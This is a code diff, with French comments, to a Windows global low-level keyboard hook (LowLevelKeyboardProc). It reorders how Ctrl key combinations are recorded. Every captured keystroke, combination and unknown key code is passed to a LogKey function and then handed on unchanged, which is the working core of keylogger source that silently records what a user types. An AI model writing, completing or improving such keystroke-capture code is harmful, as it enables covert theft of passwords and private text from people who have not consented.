@@ -95,6 +95,12 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         int ctrlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
         if (ctrlDown) {
+            // touches spéciales avec Ctrl : les traiter d'abord pour éviter le fallback générique
+            if (vkCode == VK_TAB) { suppress_ctrl_up = 1; LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_SPACE) { suppress_ctrl_up = 1; LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_BACK) { suppress_ctrl_up = 1; LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+
             // si la touche est une lettre ou un chiffre, afficher directement le VK
             if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
                 char comboBuf[8];
@@ -107,6 +113,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 LogKey(out);
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
+
             // essayer d'obtenir un nom lisible via GetKeyNameTextA (fallback)
             CHAR keyName[64] = {0};
             LONG lParamForName = (pKeyboard->scanCode << 16);
@@ -118,12 +125,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 LogKey(comboBuf);
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
-
-            // sinon gérer quelques touches spéciales avec Ctrl
-            if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_TAB) { suppress_ctrl_up = 1; LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_SPACE) { suppress_ctrl_up = 1; LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_BACK) { suppress_ctrl_up = 1; LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
 
             // si non reconnu, logger code hex en fallback et empêcher double-écriture
             char comboBufHex[32];
